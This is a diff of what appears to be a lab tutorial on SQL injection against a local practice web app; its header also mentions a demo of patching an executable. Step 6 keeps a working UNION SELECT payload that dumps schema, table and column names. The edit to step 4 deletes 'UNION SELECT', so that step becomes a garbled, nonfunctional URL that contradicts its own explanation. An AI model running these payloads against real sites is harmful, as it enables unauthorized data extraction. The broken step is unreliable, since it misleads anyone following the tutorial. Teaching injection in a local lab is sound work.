@@ -1685,7 +1685,7 @@ In this demo we take an EXE and we modify the success statement and make it alwa
 1. Click 1st Category to Populate the Products by Category Database
 2. Within the URL you notice: http://127.0.0.1:2500/cases/productsCategory.php?category=1
 3. You can input commands after the category=1 placement
-4. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT 1,2,3(4,5,6, etc)
+4. http://127.0.0.1:2500/cases/productsCategory.php?category=1   1,2,3(4,5,6, etc)
 	This will allow you to see how big the table is and let you feel for the database size.
 5. Once you know the size of the database you can use the golden statement to get all the information on the database
 6. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
